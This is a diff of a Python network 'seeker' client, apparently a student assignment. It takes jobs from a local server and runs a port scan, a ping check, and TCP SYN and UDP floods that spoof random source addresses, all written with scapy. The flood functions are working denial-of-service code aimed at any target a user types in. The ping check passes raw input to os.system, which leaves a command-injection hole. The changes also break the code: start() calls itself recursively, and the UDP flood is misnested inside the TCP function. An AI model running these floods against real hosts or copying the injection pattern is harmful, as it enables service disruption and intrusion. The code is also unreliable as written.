@@ -3,18 +3,16 @@ from socket import *
 from scapy.layers.inet import IP, TCP, sr1, sr, UDP
 from scapy.volatile import RandShort
 from scapy.all import send
-import json, sys, random
+import json, sys, random, os
 logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
 
 class seeker:
     creatorName = '127.0.0.1'
 
-    def __init__(self, port):
+    #   Connected to the job creator
+    def start(self, port):
         self.creatorPort = int(port)
         self.start()
-    
-    #   Connected to the job creator
-    def start(self):
         try:
             self.seekerSocket = socket(AF_INET, SOCK_STREAM)
             self.seekerSocket.connect((self.creatorName,self.creatorPort))
@@ -98,95 +96,109 @@ class seeker:
 
     #   Assignment 3, job switch
     def job_switch(self, job_code):
-        try:
-            if job_code == '1':
-                print('Job: Scan Port')
-                self.scanPort()
-            elif job_code == '2':
-                print('Job: Check Host')
-                self.checkHost(input('Enter host: '))
-            elif job_code == '3':
-                print('Job: TCP Flood')
-                self.SYN_TCP_Flood(input('Enter destination IP: '),input('Enter destination port: '),input('Enter counter: '))
-            elif job_code == '4':
-                print('Job: UDP Flood')
-                self.SYN_UDP_Flood(input('Enter destination IP: '),input('Enter destination port: '),input('Enter counter: '))
-            else:
-                print('invalid input: ' + str(job_code))
-            return 1
-        except:
-            return 0
+        if job_code == '1':
+            print('Job: Scan Port')
+            status = self.scanPort()
+        elif job_code == '2':
+            print('Job: Check Host')
+            status = self.checkHost(input('Enter host: '))
+        elif job_code == '3':
+            print('Job: TCP Flood')
+            status = self.SYN_TCP_Flood(input('Enter destination IP: '),input('Enter destination port: '),input('Enter counter: '))
+        elif job_code == '4':
+            print('Job: UDP Flood')
+            status = self.SYN_UDP_Flood(input('Enter destination IP: '),input('Enter destination port: '),input('Enter counter: '))
+        else:
+            print('invalid input: ' + str(job_code))
+        return status
 
     #   Assignment 3, Part 2, one-to-one part 2
     def scanPort(self, dst_ip='127.0.0.1', src_port=RandShort(), port = 26):
-        print()
-        tcp_connect_scan_resp = sr1(IP(dst=dst_ip)/TCP(sport=src_port,dport=port,flags='S'),timeout=10)
+        try:
+            print()
+            tcp_connect_scan_resp = sr1(IP(dst=dst_ip)/TCP(sport=src_port,dport=port,flags='S'),timeout=10)
 
-        if str(type(tcp_connect_scan_resp)) == "<type 'NoneType'>":
-            print("Filtered")
-        elif(tcp_connect_scan_resp.haslayer(TCP)):
-            if(tcp_connect_scan_resp.getlayer(TCP).flags == 0x12):
-                send_rst = sr(IP(dst=dst_ip)/TCP(sport=src_port,dport=port,flags='AR'),timeout=10)
-                print(port, 'Open')
-            elif(tcp_connect_scan_resp.getlayer(TCP).flags == 0x14):
-                print('Closed')
-        print()
+            if str(type(tcp_connect_scan_resp)) == "<type 'NoneType'>":
+                print("Filtered")
+            elif(tcp_connect_scan_resp.haslayer(TCP)):
+                if(tcp_connect_scan_resp.getlayer(TCP).flags == 0x12):
+                    send_rst = sr(IP(dst=dst_ip)/TCP(sport=src_port,dport=port,flags='AR'),timeout=10)
+                    print(port, 'Open')
+                elif(tcp_connect_scan_resp.getlayer(TCP).flags == 0x14):
+                    print('Closed')
+            print()
+            return 1
+        except:
+            return 0
 
     #   Assignment 3, Part 2, one-to-one part 1
     def checkHost(self, host):
         HOST_UP  = True if os.system("ping " + host) == 0 else False
 
+        if HOST_UP:
+            return 1
+        else:
+            return 0
+
     #   Assignment 3, Part 2, one-to-many part 2
     def SYN_TCP_Flood(self, dstIP, dstPort, counter):
-        total = 0
-        print("Packets are sending ...")
-        for x in range(0,int(counter)):
-            s_port = random.randint(1000,9000)
-            s_eq = random.randint(1000,9000)
-            w_indow = random.randint(1000,9000)
+        try:
+            total = 0
+            print("Packets are sending ...")
+            for x in range(0,int(counter)):
+                s_port = random.randint(1000,9000)
+                s_eq = random.randint(1000,9000)
+                w_indow = random.randint(1000,9000)
 
-            IP_Packet = IP ()
-            IP_Packet.src = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
-            IP_Packet.dst = dstIP
+                IP_Packet = IP ()
+                IP_Packet.src = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
+                IP_Packet.dst = dstIP
 
-            #   Created our own TCP packet
-            TCP_Packet = TCP()	
-            TCP_Packet.sport = s_port
-            TCP_Packet.dport = int(dstPort)
-            TCP_Packet.flags = "S"
-            TCP_Packet.seq = s_eq
-            TCP_Packet.window = w_indow
+                #   Created our own TCP packet
+                TCP_Packet = TCP()	
+                TCP_Packet.sport = s_port
+                TCP_Packet.dport = int(dstPort)
+                TCP_Packet.flags = "S"
+                TCP_Packet.seq = s_eq
+                TCP_Packet.window = w_indow
 
-            send(IP_Packet/TCP_Packet, verbose=0)
-            total+=1
-        print("\nTotal packets sent: %i\n" % total)
-        print()
+                send(IP_Packet/TCP_Packet, verbose=0)
+                total+=1
+            print("\nTotal packets sent: %i\n" % total)
+            print()
+            return 1
+        except:
+            return 0
 
-    #   Assignment 3, Part 2, one-to-many part 3
-    def SYN_UDP_Flood(self, dstIP, dstPort, counter):
-        total = 0
-        print("Packets are sending ...")
-        for x in range (0, int(counter)):
-            s_port = random.randint(1000,9000)
-            s_eq = random.randint(1000,9000)
-            w_indow = random.randint(1000,9000)
+        #   Assignment 3, Part 2, one-to-many part 3
+        def SYN_UDP_Flood(self, dstIP, dstPort, counter):
+            try:
+                total = 0
+                print("Packets are sending ...")
+                for x in range (0, int(counter)):
+                    s_port = random.randint(1000,9000)
+                    s_eq = random.randint(1000,9000)
+                    w_indow = random.randint(1000,9000)
 
-            IP_Packet = IP ()
-            IP_Packet.src = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
-            IP_Packet.dst = dstIP
+                    IP_Packet = IP ()
+                    IP_Packet.src = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
+                    IP_Packet.dst = dstIP
 
-            #   Created our own TCP packet
-            UDP_Packet = UDP()	
-            UDP_Packet.sport = s_port
-            UDP_Packet.dport = int(dstPort)
-            UDP_Packet.flags = "S"
-            UDP_Packet.seq = s_eq
-            UDP_Packet.window = w_indow
+                    #   Created our own TCP packet
+                    UDP_Packet = UDP()	
+                    UDP_Packet.sport = s_port
+                    UDP_Packet.dport = int(dstPort)
+                    UDP_Packet.flags = "S"
+                    UDP_Packet.seq = s_eq
+                    UDP_Packet.window = w_indow
 
-            send(IP_Packet/UDP_Packet, verbose=0)
-            total+=1
-        print("\nTotal packets sent: %i\n" % total)
-        print()
+                    send(IP_Packet/UDP_Packet, verbose=0)
+                    total+=1
+                print("\nTotal packets sent: %i\n" % total)
+                print()
+                return 1
+            except:
+                return 0
 
 if __name__ == "__main__":
-    seeker(input('Enter port #: '))
+    seeker().start(input('Enter port #: '))
